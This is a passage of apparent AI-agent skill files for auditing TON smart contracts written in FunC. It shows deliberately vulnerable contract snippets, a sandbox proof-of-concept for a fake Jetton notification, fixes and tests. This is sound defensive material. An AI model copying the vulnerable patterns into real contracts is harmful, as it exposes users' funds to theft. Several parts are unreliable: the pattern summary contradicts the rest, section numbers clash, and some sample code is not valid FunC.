deployed contract analyzed)\n\n**Token Information**:\n- Name, Symbol, Decimals\n- Total Supply\n- Contract address(es)\n\n**Holder Distribution**:\n- Total holders\n- Top 10 holder percentage\n- Concentration risk\n\n**Exchange Distribution**:\n- Listings on major DEXs\n- Liquidity concentration\n- Single point of failure risk\n\n**Configuration**:\n- Owner/admin address\n- Pause status\n- Upgrade configuration\n- Minting caps\n\n---\n\n## 4. Integration Safety Assessment\n\n(If analyzing protocol integrating tokens)\n\n**Safe Transfer Usage**:\n- SafeERC20 library usage\n- Return value checking\n- Balance verification\n\n**Defensive Patterns**:\n- Reentrancy protection\n- Fee-on-transfer handling\n- Zero value handling\n- Allowlist implementation\n\n**Weird Token Handling**:\n- Missing returns handled\n- Fee-on-transfer protected\n- Rebase-safe accounting\n- Blocklist-aware design\n\n---\n\n## 5. Prioritized Recommendations\n\n**CRITICAL** (fix before deployment):\n- Missing return value checks\n- Reentrancy vulnerabilities\n- Unsafe transfer patterns\n- ERC non-conformities causing loss\n\n**HIGH** (fix soon):\n- Fee-on-transfer mishandling\n- Rebase token incompatibility\n- Insufficient scarcity safeguards\n- Owner privilege risks\n\n**MEDIUM** (improve security):\n- Upgrade detection\n- Allowlist implementation\n- Better defensive patterns\n- Zero value handling\n\n**LOW** (best practices):\n- Additional Slither checks\n- Property-based testing\n- Documentation improvements\n",
        "plugins/building-secure-contracts/skills/ton-vulnerability-scanner/SKILL.md": "---\nname: ton-vulnerability-scanner\ndescription: Scans TON (The Open Network) smart contracts for 3 critical vulnerabilities including integer-as-boolean misuse, fake Jetton contracts, and forward TON without gas checks. Use when auditing FunC contracts.\n---\n\n# TON Vulnerability Scanner\n\n## 1. Purpose\n\nSystematically scan TON blockchain smart contracts written in FunC for platform-specific security vulnerabilities related to boolean logic, Jetton token handling, and gas management. This skill encodes 3 critical vulnerability patterns unique to TON's architecture.\n\n## 2. When to Use This Skill\n\n- Auditing TON smart contracts (FunC language)\n- Reviewing Jetton token implementations\n- Validating token transfer notification handlers\n- Pre-launch security assessment of TON dApps\n- Reviewing gas forwarding logic\n- Assessing boolean condition handling\n\n## 3. Platform Detection\n\n### File Extensions & Indicators\n- **FunC files**: `.fc`, `.func`\n\n### Language/Framework Markers\n```func\n;; FunC contract indicators\n#include \"imports/stdlib.fc\";\n\n() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {\n    ;; Contract logic\n}\n\n() recv_external(slice in_msg) impure {\n    ;; External message handler\n}\n\n;; Common patterns\nsend_raw_message()\nload_uint(), load_msg_addr(), load_coins()\nbegin_cell(), end_cell(), store_*()\ntransfer_notification operation\nop::transfer, op::transfer_notification\n.store_uint().store_slice().store_coins()\n```\n\n### Project Structure\n- `contracts/*.fc` - FunC contract source\n- `wrappers/*.ts` - TypeScript wrappers\n- `tests/*.spec.ts` - Contract tests\n- `ton.config.ts` or `wasm.config.ts` - TON project config\n\n### Tool Support\n- **TON Blueprint**: Development framework for TON\n- **toncli**: CLI tool for TON contracts\n- **ton-compiler**: FunC compiler\n- Manual review primarily (limited automated tools)\n\n---\n\n## 4. How This Skill Works\n\nWhen invoked, I will:\n\n1. **Search your codebase** for FunC/Tact contracts\n2. **Analyze each contract** for the 3 vulnerability patterns\n3. **Report findings** with file references and severity\n4. **Provide fixes** for each identified issue\n5. **Check replay protection** and sender validation\n\n---\n\n## 5. Example Output\n\nWhen vulnerabilities are found, you'll get a report like this:\n\n```\n=== TON VULNERABILITY SCAN RESULTS ===\n\nProject: my-ton-contract\nFiles Scanned: 3 (.fc, .tact)\nVulnerabilities Found: 2\n\n---\n\n[CRITICAL] Missing Replay Protection\nFile: contracts/wallet.fc:45\nPattern: No sequence number or nonce validation\n\n\n---\n\n## 5. Vulnerability Patterns (3 Patterns)\n\nI check for 3 critical vulnerability patterns unique to TON. For detailed detection patterns, code examples, mitigations, and testing strategies, see [VULNERABILITY_PATTERNS.md](resources/VULNERABILITY_PATTERNS.md).\n\n### Pattern Summary:\n\n1. **Missing Sender Check**  CRITICAL - No sender validation on privileged operations\n2. **Integer Overflow**  CRITICAL - Unchecked arithmetic in FunC\n3. **Improper Gas Handling**  HIGH - Insufficient gas reservations\n\nFor complete vulnerability patterns with code examples, see [VULNERABILITY_PATTERNS.md](resources/VULNERABILITY_PATTERNS.md).\n## 5. Scanning Workflow\n\n### Step 1: Platform Identification\n1. Verify FunC language (`.fc` or `.func` files)\n2. Check for TON Blueprint or toncli project structure\n3. Locate contract source files\n4. Identify Jetton-related contracts\n\n### Step 2: Boolean Logic Review\n```bash\n# Find boolean-like variables\nrg \"int.*is_|int.*has_|int.*flag|int.*enabled\" contracts/\n\n# Check for positive integers used as booleans\nrg \"= 1;|return 1;\" contracts/ | grep -E \"is_|has_|flag|enabled|valid\"\n\n# Look for NOT operations on boolean-like values\nrg \"~.*\\(|~ \" contracts/\n```\n\nFor each boolean:\n- [ ] Uses -1 for true, 0 for false\n- [ ] NOT using 1 or other positive integers\n- [ ] Logic operations work correctly\n\n### Step 3: Jetton Handler Analysis\n```bash\n# Find transfer_notification handlers\nrg \"transfer_notification|op::transfer_notification\" contracts/\n```\n\nFor each Jetton handler:\n- [ ] Validates sender address\n- [ ] Sender checked against stored Jetton wallet address\n- [ ] Cannot trust forward_payload without sender validation\n- [ ] Has admin function to set Jetton wallet address\n\n### Step 4: Gas/Forward Amount Review\n```bash\n# Find forward amount usage\nrg \"forward_ton_amount|forward_amount\" contracts/\nrg \"load_coins\\(\\)\" contracts/\n\n# Find send_raw_message calls\nrg \"send_raw_message\" contracts/\n```\n\nFor each outgoing message:\n- [ ] Forward amounts are fixed/bounded\n- [ ] OR user-provided amounts validated against msg_value\n- [ ] Cannot drain contract balance\n- [ ] Appropriate send_raw_message flags used\n\n### Step 5: Manual Review\nTON contracts require thorough manual review:\n- Boolean logic with `~`, `&`, `|` operators\n- Message parsing and validation\n- Gas economics and fee calculations\n- Storage operations and data serialization\n\n---\n\n## 6. Reporting Format\n\n### Finding Template\n```markdown\n## [CRITICAL] Fake Jetton Contract - Missing Sender Validation\n\n**Location**: `contracts/staking.fc:85-95` (recv_internal, transfer_notification handler)\n\n**Description**:\nThe `transfer_notification` operation handler does not validate that the sender is the expected Jetton wallet contract. Any attacker can send a fake `transfer_notification` message claiming to have transferred tokens, crediting themselves without actually depositing any Jettons.\n\n**Vulnerable Code**:\n```func\n// staking.fc, line 85\nif (op == op::transfer_notification) {\n    int jetton_amount = in_msg_body~load_coins();\n    slice from_user = in_msg_body~load_msg_addr();\n\n    ;; WRONG: No validation of sender_address!\n    ;; Attacker can claim any jetton_amount\n\n    credit_user(from_user, jetton_amount);\n}\n```\n\n**Attack Scenario**:\n1. Attacker deploys malicious contract\n2. Malicious contract sends `transfer_notification` message to staking contract\n3. Message claims attacker transferred 1,000,000 Jettons\n4. Staking contract credits attacker without checking sender\n5. Attacker can now withdraw from contract or gain benefits without depositing\n\n**Proof of Concept**:\n```typescript\n// Attacker sends fake transfer_notification\nconst attackerContract = await blockchain.treasury(\"attacker\");\n\nawait stakingContract.sendInternalMessage(attackerContract.getSender(), {\n  op: OP_CODES.TRANSFER_NOTIFICATION,\n  jettonAmount: toNano(\"1000000\"), // Fake amount\n  fromUser: attackerContract.address,\n});\n\n// Attacker successfully credited without sending real Jettons\nconst balance = await stakingContract.getUserBalance(attackerContract.address);\nexpect(balance).toEqual(toNano(\"1000000\")); // Attack succeeded\n```\n\n**Recommendation**:\nStore expected Jetton wallet address and validate sender:\n```func\nglobal slice jetton_wallet_address;\n\n() recv_internal(...) impure {\n    load_data();  ;; Load jetton_wallet_address from storage\n\n    slice cs = in_msg_full.begin_parse();\n    int flags = cs~load_uint(4);\n    slice sender_address = cs~load_msg_addr();\n\n    int op = in_msg_body~load_uint(32);\n\n    if (op == op::transfer_notification) {\n        ;; CRITICAL: Validate sender\n        throw_unless(error::wrong_jetton_wallet,\n            equal_slices(sender_address, jetton_wallet_address));\n\n        int jetton_amount = in_msg_body~load_coins();\n        slice from_user = in_msg_body~load_msg_addr();\n\n        ;; Safe to credit user\n        credit_user(from_user, jetton_amount);\n    }\n}\n```\n\n**References**:\n- building-secure-contracts/not-so-smart-contracts/ton/fake_jetton_contract\n```\n\n---\n\n## 7. Priority Guidelines\n\n### Critical (Immediate Fix Required)\n- Fake Jetton contract (unauthorized minting/crediting)\n\n### High (Fix Before Launch)\n- Integer as boolean (logic errors, broken conditions)\n- Forward TON without gas check (balance drainage)\n\n---\n\n## 8. Testing Recommendations\n\n### Unit Tests\n```typescript\nimport { Blockchain } from \"@ton/sandbox\";\nimport { toNano } from \"ton-core\";\n\ndescribe(\"Security tests\", () => {\n  let blockchain: Blockchain;\n  let contract: Contract;\n\n  beforeEach(async () => {\n    blockchain = await Blockchain.create();\n    contract = blockchain.openContract(await Contract.fromInit());\n  });\n\n  it(\"should use correct boolean values\", async () => {\n    // Test that TRUE = -1, FALSE = 0\n    const result = await contract.getFlag();\n    expect(result).toEqual(-1n); // True\n    expect(result).not.toEqual(1n); // Not 1!\n  });\n\n  it(\"should reject fake jetton transfer\", async () => {\n    const attacker = await blockchain.treasury(\"attacker\");\n\n    const result = await contract.send(\n      attacker.getSender(),\n      { value: toNano(\"0.05\") },\n      {\n        $$type: \"TransferNotification\",\n        query_id: 0n,\n        amount: toNano(\"1000\"),\n        from: attacker.address,\n      }\n    );\n\n    expect(result.transactions).toHaveTransaction({\n      success: false, // Should reject\n    });\n  });\n\n  it(\"should validate gas for forward amount\", async () => {\n    const result = await contract.send(\n      user.getSender(),\n      { value: toNano(\"0.01\") }, // Insufficient gas\n      {\n        $$type: \"Transfer\",\n        to: recipient.address,\n        forward_ton_amount: toNano(\"1\"), // Trying to forward 1 TON\n      }\n    );\n\n    expect(result.transactions).toHaveTransaction({\n      success: false,\n    });\n  });\n});\n```\n\n### Integration Tests\n```typescript\n// Test with real Jetton wallet\nit(\"should accept transfer from real jetton wallet\", async () => {\n  // Deploy actual Jetton minter and wallet\n  const jettonMinter = await blockchain.openContract(JettonMinter.create());\n  const userJettonWallet = await jettonMinter.getWalletAddress(user.address);\n\n  // Set jetton wallet in contract\n  await contract.setJettonWallet(userJettonWallet);\n\n  // Real transfer from Jetton wallet\n  const result = await userJettonWallet.sendTransfer(\n    user.getSender(),\n    contract.address,\n    toNano(\"100\"),\n    {}\n  );\n\n  expect(result.transactions).toHaveTransaction({\n    to: contract.address,\n    success: true,\n  });\n});\n```\n\n---\n\n## 9. Additional Resources\n\n- **Building Secure Contracts**: `building-secure-contracts/not-so-smart-contracts/ton/`\n- **TON Documentation**: https://docs.ton.org/\n- **FunC Documentation**: https://docs.ton.org/develop/func/overview\n- **TON Blueprint**: https://github.com/ton-org/blueprint\n- **Jetton Standard**: https://github.com/ton-blockchain/TEPs/blob/master/text/0074-jettons-standard.md\n\n---\n\n## 10. Quick Reference Checklist\n\nBefore completing TON contract audit:\n\n**Boolean Logic (HIGH)**:\n- [ ] All boolean values use -1 (true) and 0 (false)\n- [ ] NO positive integers (1, 2, etc.) used as booleans\n- [ ] Functions returning booleans return -1 for true\n- [ ] Boolean logic with `~`, `&`, `|` uses correct values\n- [ ] Tests verify boolean operations work correctly\n\n**Jetton Security (CRITICAL)**:\n- [ ] `transfer_notification` handler validates sender address\n- [ ] Sender checked against stored Jetton wallet address\n- [ ] Jetton wallet address stored during initialization\n- [ ] Admin function to set/update Jetton wallet\n- [ ] Cannot trust forward_payload without sender validation\n- [ ] Tests with fake Jetton contracts verify rejection\n\n**Gas & Forward Amounts (HIGH)**:\n- [ ] Forward TON amounts are fixed/bounded\n- [ ] OR user-provided amounts validated: `msg_value >= tx_fee + forward_amount`\n- [ ] Contract balance protected from drainage\n- [ ] Appropriate `send_raw_message` flags used\n- [ ] Tests verify cannot drain contract with excessive forward amounts\n\n**Testing**:\n- [ ] Unit tests for all three vulnerability types\n- [ ] Integration tests with real Jetton contracts\n- [ ] Gas cost analysis for all operations\n- [ ] Testnet deployment before mainnet\n",
        "plugins/building-secure-contracts/skills/ton-vulnerability-scanner/resources/VULNERABILITY_PATTERNS.md": "## 6. Vulnerability Checklist (3 Patterns)\n\n### 6.1 INTEGER AS BOOLEAN  HIGH\n\n**Description**: FunC uses integers for boolean values (0 = false, -1 = true). The bitwise NOT operator `~` on non-standard boolean values (positive integers) produces unexpected results, causing logic errors.\n\n**Background**:\n- FunC `true` = -1 (all bits set: `0xFFFFFFFF...`)\n- FunC `false` = 0 (all bits clear: `0x00000000...`)\n- `~` is bitwise NOT: `~0 = -1`, `~(-1) = 0`\n- But `~1 = -2` (not 0!), `~2 = -3` (not 0!)\n\n**Detection Patterns**:\n```func\n;; VULNERABLE: Using positive integers as booleans\nint is_active = 1;  ;; WRONG: Should be -1 for true, 0 for false\n\nif (is_active) {\n    ;; This works - 1 is truthy\n}\n\nif (~ is_active) {\n    ;; PROBLEM: ~1 = -2, which is still truthy!\n    ;; This branch will ALWAYS execute, not just when is_active is false\n}\n\n;; VULNERABLE: Returning positive integers as booleans\nint is_valid(int value) {\n    if (value > 100) {\n        return 1;  ;; WRONG: Should return -1\n    }\n    return 0;  ;; Correct for false\n}\n\nint valid = is_valid(150);  ;; Returns 1\nif (~ valid) {\n    ;; PROBLEM: ~1 = -2 (truthy), this executes when it shouldn't!\n}\n\n;; VULNERABLE: Boolean arithmetic\nint flag1 = 1;  ;; Wrong true value\nint flag2 = 1;  ;; Wrong true value\nint both_true = flag1 & flag2;  ;; 1 & 1 = 1 (works)\nint neither_true = (~ flag1) & (~ flag2);  ;; ~1 & ~1 = -2 & -2 = -2 (WRONG!)\n;; Expected 0 (false), got -2 (truthy)\n```\n\n**What to Check**:\n- [ ] All boolean values use 0 (false) or -1 (true)\n- [ ] NO positive integers (1, 2, etc.) used as booleans\n- [ ] Functions returning booleans return -1 (not 1) for true\n- [ ] Boolean logic with `~`, `&`, `|` uses correct values\n- [ ] Conditions test against 0 explicitly where needed\n\n**Mitigation**:\n```func\n;; SECURE: Use correct boolean values\nconst int TRUE = -1;   ;; All bits set\nconst int FALSE = 0;   ;; All bits clear\n\nint is_active = TRUE;  ;; Correct\n\nif (is_active) {\n    ;; Works correctly\n}\n\nif (~ is_active) {\n    ;; Works correctly: ~(-1) = 0 (falsy)\n}\n\n;; SECURE: Return correct boolean values\nint is_valid(int value) method_id {\n    if (value > 100) {\n        return TRUE;   ;; -1 for true\n    }\n    return FALSE;      ;; 0 for false\n}\n\nint valid = is_valid(150);\nif (~ valid) {\n    ;; Correct: ~(-1) = 0 (falsy), this doesn't execute\n}\n\n;; SECURE: Boolean operations with correct values\nint flag1 = TRUE;   ;; -1\nint flag2 = TRUE;   ;; -1\nint both_true = flag1 & flag2;         ;; -1 & -1 = -1 (TRUE)\nint neither_true = (~ flag1) & (~ flag2);  ;; 0 & 0 = 0 (FALSE)\n\n;; SECURE: Explicit comparisons when needed\nint status_code = get_status();  ;; Returns 0, 1, 2, etc.\n\n;; Instead of treating as boolean:\nif (status_code) { }  ;; Ambiguous!\n\n;; Explicitly compare:\nif (status_code != 0) { }  ;; Clear intent\nif (status_code == 1) { }  ;; Even better\n```\n\n**Common Mistake Patterns**:\n```func\n;; MISTAKE 1: Loading boolean from storage/message\nslice cs = get_data().begin_parse();\nint flag = cs~load_uint(1);  ;; Returns 0 or 1, not 0 or -1!\n\n;; FIX: Convert to proper boolean\nint flag_bool = flag ? TRUE : FALSE;\n\n;; MISTAKE 2: Comparing with 1 instead of TRUE\nint is_owner = sender == owner_address;  ;; Returns 0 or -1 (correct)\n\nif (is_owner == 1) {  ;; WRONG: will never match\n    ;; This never executes!\n}\n\n;; FIX: Compare with TRUE or just use directly\nif (is_owner == TRUE) { }  ;; Correct\nif (is_owner) { }          ;; Also correct\n\n;; MISTAKE 3: Returning count as boolean\nint count_items() {\n    return items.length;  ;; Returns 0, 1, 2, 3... (not boolean!)\n}\n\nint has_items = count_items();\nif (~ has_items) {\n    ;; WRONG: ~1 = -2 (truthy), ~2 = -3 (truthy), etc.\n}\n\n;; FIX: Return proper boolean or use explicit comparison\nint has_items() {\n    return items.length > 0 ? TRUE : FALSE;\n}\n;; OR\nint count = count_items();\nif (count == 0) { }  ;; Explicit comparison\n```\n\n**Testing**:\n```func\n;; Test boolean logic\nint test_boolean_logic() {\n    int t = TRUE;\n    int f = FALSE;\n\n    ;; Basic logic\n    throw_unless(100, t == -1);\n    throw_unless(101, f == 0);\n\n    ;; Negation\n    throw_unless(102, ~t == f);\n    throw_unless(103, ~f == t);\n\n    ;; AND logic\n    throw_unless(104, t & t == t);\n    throw_unless(105, t & f == f);\n    throw_unless(106, f & f == f);\n\n    ;; OR logic\n    throw_unless(107, t | t == t);\n    throw_unless(108, t | f == t);\n    throw_unless(109, f | f == f);\n\n    return TRUE;\n}\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/ton/integer_as_boolean\n\n---\n\n### 4.2 FAKE JETTON CONTRACT  CRITICAL\n\n**Description**: The `transfer_notification` operation can be sent by any contract. Without sender validation, attackers can send fake transfer notifications claiming to have transferred tokens that were never sent.\n\n**Background**:\n- Jetton (TON's token standard) uses `transfer_notification` to notify recipients\n- Real flow: User  Jetton Wallet  Receiver (with notification)\n- Attack: Attacker  Receiver (fake notification, no Jetton Wallet involved)\n\n**Detection Patterns**:\n```func\n;; VULNERABLE: No sender validation in transfer_notification\n() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {\n    slice cs = in_msg_full.begin_parse();\n    int flags = cs~load_uint(4);\n    slice sender_address = cs~load_msg_addr();\n\n    int op = in_msg_body~load_uint(32);\n\n    if (op == op::transfer_notification) {\n        ;; WRONG: No validation of sender_address!\n        int jetton_amount = in_msg_body~load_coins();\n        slice from_user = in_msg_body~load_msg_addr();\n        slice forward_payload = in_msg_body;\n\n        ;; Process as if jettons were received\n        ;; Attacker can claim any jetton_amount without actually sending tokens!\n        credit_user(from_user, jetton_amount);\n    }\n}\n\n;; VULNERABLE: Validating user address but not Jetton wallet\nif (op == op::transfer_notification) {\n    int jetton_amount = in_msg_body~load_coins();\n    slice from_user = in_msg_body~load_msg_addr();\n\n    ;; Validates from_user but not sender!\n    throw_unless(error::unauthorized, equal_slices(from_user, authorized_user));\n\n    ;; WRONG: Anyone can send this message claiming to be from authorized_user\n    credit_user(from_user, jetton_amount);\n}\n\n;; VULNERABLE: Trusting forward_payload data\nif (op == op::transfer_notification) {\n    int jetton_amount = in_msg_body~load_coins();\n    slice from_user = in_msg_body~load_msg_addr();\n    slice forward_payload = in_msg_body;\n\n    ;; Parse data from forward_payload\n    int token_id = forward_payload~load_uint(32);\n\n    ;; WRONG: Attacker controls all this data!\n    ;; Can claim any token_id, any jetton_amount\n}\n```\n\n**What to Check**:\n- [ ] `transfer_notification` handler validates sender address\n- [ ] Sender must be expected Jetton wallet address\n- [ ] Jetton wallet addresses stored during initialization\n- [ ] Cannot trust forward_payload without sender validation\n- [ ] User address in notification is NOT sufficient validation\n\n**Mitigation**:\n```func\n;; SECURE: Store expected Jetton wallet address at initialization\nglobal slice jetton_wallet_address;\n\n() load_data() impure {\n    slice ds = get_data().begin_parse();\n    jetton_wallet_address = ds~load_msg_addr();\n    ;; Load other data\n}\n\n() save_data() impure {\n    set_data(begin_cell()\n        .store_slice(jetton_wallet_address)\n        ;; Store other data\n        .end_cell());\n}\n\n;; Initialize with Jetton wallet address\n() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {\n    load_data();\n\n    slice cs = in_msg_full.begin_parse();\n    int flags = cs~load_uint(4);\n    slice sender_address = cs~load_msg_addr();\n\n    int op = in_msg_body~load_uint(32);\n\n    if (op == op::transfer_notification) {\n        ;; CRITICAL: Validate sender is expected Jetton wallet\n        throw_unless(error::wrong_jetton_wallet,\n            equal_slices(sender_address, jetton_wallet_address));\n\n        ;; Now safe to trust the notification\n        int jetton_amount = in_msg_body~load_coins();\n        slice from_user = in_msg_body~load_msg_addr();\n        slice forward_payload = in_msg_body;\n\n        ;; Can safely credit user\n        credit_user(from_user, jetton_amount);\n\n        ;; Can safely parse forward_payload\n        if (~ forward_payload.slice_empty?()) {\n            int token_id = forward_payload~load_uint(32);\n            ;; Use token_id\n        }\n    }\n}\n\n;; SECURE: Multiple Jetton support with dictionary\nglobal cell jetton_wallets;  ;; Dictionary: jetton_type -> wallet_address\n\n() load_data() impure {\n    slice ds = get_data().begin_parse();\n    jetton_wallets = ds~load_dict();\n}\n\n() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {\n    load_data();\n\n    slice cs = in_msg_full.begin_parse();\n    int flags = cs~load_uint(4);\n    slice sender_address = cs~load_msg_addr();\n\n    int op = in_msg_body~load_uint(32);\n\n    if (op == op::transfer_notification) {\n        int jetton_amount = in_msg_body~load_coins();\n        slice from_user = in_msg_body~load_msg_addr();\n        slice forward_payload = in_msg_body;\n\n        ;; Parse jetton type from forward_payload\n        int jetton_type = forward_payload~load_uint(8);\n\n        ;; Look up expected wallet address for this jetton type\n        (slice expected_wallet, int found) = jetton_wallets.udict_get?(256, jetton_type);\n\n        ;; Validate sender matches expected wallet\n        throw_unless(error::unauthorized_jetton,\n            found & equal_slices(sender_address, expected_wallet));\n\n        ;; Safe to process\n        credit_user_jetton(from_user, jetton_type, jetton_amount);\n    }\n}\n```\n\n**Admin Function to Set Jetton Wallet**:\n```func\n;; Only owner can set/update Jetton wallet address\nif (op == op::set_jetton_wallet) {\n    throw_unless(error::unauthorized, equal_slices(sender_address, owner_address));\n\n    slice new_jetton_wallet = in_msg_body~load_msg_addr();\n    jetton_wallet_address = new_jetton_wallet;\n\n    save_data();\n    return ();\n}\n```\n\n**Testing**:\n```typescript\n// Test fake transfer notification is rejected\nit(\"should reject fake transfer notification\", async () => {\n  const attacker = await blockchain.treasury(\"attacker\");\n\n  // Attacker sends fake transfer_notification directly\n  const result = await contract.sendInternalMessage(attacker.getSender(), {\n    op: OP_CODES.TRANSFER_NOTIFICATION,\n    jettonAmount: toNano(\"1000\"),\n    fromUser: user.address,\n  });\n\n  expect(result.transactions).toHaveTransaction({\n    from: attacker.address,\n    to: contract.address,\n    success: false, // Should be rejected\n    exitCode: ERROR_CODES.WRONG_JETTON_WALLET,\n  });\n});\n\n// Test real Jetton wallet notification is accepted\nit(\"should accept real jetton transfer\", async () => {\n  // Send from actual Jetton wallet\n  const result = await contract.sendInternalMessage(jettonWallet.address, {\n    op: OP_CODES.TRANSFER_NOTIFICATION,\n    jettonAmount: toNano(\"100\"),\n    fromUser: user.address,\n  });\n\n  expect(result.transactions).toHaveTransaction({\n    from: jettonWallet.address,\n    to: contract.address,\n    success: true,\n  });\n});\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/ton/fake_jetton_contract\n\n---\n\n### 4.3 FORWARD TON WITHOUT GAS CHECK  HIGH\n\n**Description**: Allowing users to specify `forward_ton_amount` in outgoing messages without validating sufficient gas can drain the contract's TON balance. User pays small gas but specifies large forward amount from contract balance.\n\n**Detection Patterns**:\n```func\n;; VULNERABLE: User-specified forward_ton_amount without validation\n() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {\n    int op = in_msg_body~load_uint(32);\n\n    if (op == op::transfer) {\n        slice to_address = in_msg_body~load_msg_addr();\n        int amount = in_msg_body~load_coins();\n        int forward_ton_amount = in_msg_body~load_coins();  ;; USER CONTROLLED!\n\n        ;; WRONG: No check that msg_value covers forward_ton_amount\n        ;; Contract pays from its own balance!\n\n        var msg = begin_cell()\n            .store_uint(0x18, 6)\n            .store_slice(to_address)\n            .store_coins(forward_ton_amount)  ;; Drains contract balance!\n            .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)\n            .end_cell();\n\n        send_raw_message(msg, 1);\n    }\n}\n\n;; VULNERABLE: No gas validation for operations\n() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {\n    int op = in_msg_body~load_uint(32);\n\n    if (op == op::claim_reward) {\n        slice user = in_msg_body~load_msg_addr();\n        int forward_amount = in_msg_body~load_coins();\n\n        ;; Calculate reward\n        int reward = calculate_reward(user);\n\n        ;; WRONG: Sends user-specified forward_amount\n        ;; No validation that msg_value >= tx_fee + forward_amount\n        var msg = begin_cell()\n            .store_uint(0x18, 6)\n            .store_slice(user)\n            .store_coins(forward_amount + reward)\n            .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)\n            .end_cell();\n\n        send_raw_message(msg, 1);  ;; Contract pays gas!\n    }\n}\n```\n\n**What to Check**:\n- [ ] User cannot specify arbitrary forward TON amounts\n- [ ] IF forward amount is user-specified: validate `msg_value >= tx_fee + forward_ton_amount`\n- [ ] Prefer fixed/bounded forward amounts\n- [ ] Contract balance protected from drainage\n- [ ] Gas costs accounted for in all operations\n\n**Mitigation**:\n```func\n;; SECURE: Fixed forward amounts (PREFERRED)\nconst int FORWARD_TON_AMOUNT = 50000000;  ;; 0.05 TON (fixed)\nconst int TX_FEE = 10000000;  ;; 0.01 TON estimated fee\n\n() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {\n    int op = in_msg_body~load_uint(32);\n\n    if (op == op::transfer) {\n        slice to_address = in_msg_body~load_msg_addr();\n        int amount = in_msg_body~load_coins();\n\n        ;; Use fixed forward amount\n        ;; No user control, no drainage risk\n\n        var msg = begin_cell()\n            .store_uint(0x18, 6)\n            .store_slice(to_address)\n            .store_coins(FORWARD_TON_AMOUNT)  ;; Fixed amount\n            .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)\n            ;; Store message body\n            .end_cell();\n\n        send_raw_message(msg, 1);\n    }\n}\n\n;; SECURE: Validate msg_value covers all costs (if user-specified)\n() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {\n    int op = in_msg_body~load_uint(32);\n\n    if (op == op::transfer_with_forward) {\n        slice to_address = in_msg_body~load_msg_addr();\n        int amount = in_msg_body~load_coins();\n        int forward_ton_amount = in_msg_body~load_coins();\n\n        ;; CRITICAL: Validate msg_value covers tx fee + forward amount\n        throw_unless(error::insufficient_gas,\n            msg_value >= TX_FEE + forward_ton_amount);\n\n        var msg = begin_cell()\n            .store_uint(0x18, 6)\n            .store_slice(to_address)\n            .store_coins(forward_ton_amount)\n            .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)\n            .end_cell();\n\n        ;; Safe: user provided sufficient gas\n        send_raw_message(msg, 1);\n    }\n}\n\n;; SECURE: Bounded forward amounts\nconst int MAX_FORWARD_TON = 100000000;  ;; 0.1 TON maximum\n\n() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {\n    int op = in_msg_body~load_uint(32);\n\n    if (op == op::claim_with_notification) {\n        slice user = in_msg_body~load_msg_addr();\n        int forward_ton_amount = in_msg_body~load_coins();\n\n        ;; Enforce maximum forward amount\n        throw_unless(error::forward_amount_too_high,\n            forward_ton_amount <= MAX_FORWARD_TON);\n\n        ;; Validate msg_value covers costs\n        throw_unless(error::insufficient_gas,\n            msg_value >= TX_FEE + forward_ton_amount);\n\n        ;; Calculate reward from contract logic\n        int reward = calculate_reward(user);\n\n        var msg = begin_cell()\n            .store_uint(0x18, 6)\n            .store_slice(user)\n            .store_coins(reward)  ;; Reward from contract\n            .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)\n            ;; Message body\n            .end_cell();\n\n        ;; Send with user's gas\n        send_raw_message(msg, 64);  ;; Flag 64: use all remaining gas from incoming message\n    }\n}\n\n;; SECURE: Don't allow user to specify forward amount at all\n() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {\n    int op = in_msg_body~load_uint(32);\n\n    if (op == op::withdraw) {\n        slice user = in_msg_body~load_msg_addr();\n\n        ;; No forward_ton_amount parameter\n        ;; Use contract's calculated amount only\n\n        int withdrawal_amount = calculate_withdrawal(user);\n\n        var msg = begin_cell()\n            .store_uint(0x18, 6)\n            .store_slice(user)\n            .store_coins(withdrawal_amount)  ;; Contract controlled\n            .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)\n            .end_cell();\n\n        send_raw_message(msg, 1);\n    }\n}\n```\n\n**Send Message Flags Reference**:\n```func\n;; send_raw_message flag values:\n;; 0   - Normal send, pay fees from message value\n;; 1   - Pay fees separately from contract balance\n;; 64  - Return remaining value from incoming message\n;; 128 - Carry all remaining balance\n\n;; Safe patterns:\nsend_raw_message(msg, 64);  ;; Use incoming msg_value for fees\nsend_raw_message(msg, 0);   ;; Fees from message value itself\n\n;; Dangerous with user input:\nsend_raw_message(msg, 1);   ;; Fees from contract - validate msg_value!\nsend_raw_message(msg, 128); ;; Never use with user-controlled amounts!\n```\n\n**Testing**:\n```typescript\n// Test cannot drain contract with large forward amount\nit(\"should reject large forward amount without sufficient gas\", async () => {\n  const result = await contract.sendInternalMessage(user.getSender(), {\n    value: toNano(\"0.01\"), // Only 0.01 TON provided\n    body: {\n      op: OP_CODES.TRANSFER,\n      toAddress: recipient.address,\n      amount: toNano(\"100\"),\n      forwardTonAmount: toNano(\"10\"), // Trying to forward 10 TON!\n    },\n  });\n\n  expect(result.transactions).toHaveTransaction({\n    success: false,\n    exitCode: ERROR_CODES.INSUFFICIENT_GAS,\n  });\n\n  // Contract balance should not decrease\n  expect(await contract.getBalance()).toEqual(initialBalance);\n});\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/ton/forward_value_without_check\n\n---\n",
